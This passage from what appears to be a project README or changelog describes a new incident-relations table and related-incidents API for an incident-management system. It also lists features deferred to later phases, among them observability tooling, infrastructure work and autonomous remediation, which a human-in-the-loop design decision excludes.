- **`incident_relations` table** (migration `0002`, lineage `0001 → 0002`) —
  composite PK, `relation_type` (`dependency` | `cross_service`), `reason`,
  `ON DELETE CASCADE`, a no-self-link check, two directional indexes.
- **Incident API** — `GET /incidents/{id}` gains a `related_incidents[]` array
  (id / service / environment / status / severity / title / timestamps).
  `IncidentRepository` gains `link_incidents(...)` and
  `get_related_incidents(id)` on both the in-memory and SQL implementations.

Same-service Phase 3 correlation is untouched; every existing test still passes.
Details: [docs/architecture/phase-8.md](docs/architecture/phase-8.md) ·
[docs/phase8-summary.md](docs/phase8-summary.md).

**Not implemented** (later phases): the full observability stack — Loki (logs) /
Tempo (traces) / an OTel collector / cross-service instrumentation beyond the
anomaly-detector; Kubernetes, AWS, Terraform,
hardened CI/CD (Phase 9); real-infrastructure remediation executors and
autonomous remediation (out of scope by design —
[ADR-003](docs/decisions/adr-003-human-in-the-loop-remediation.md));
autonomous / scheduled retraining (Phase 6 is CLI-driven by design);
authentication (the approver identity model is a demo, not auth);
incident merging and topology **discovery** (Phase 8 links are advisory, over a
hand-declared graph).
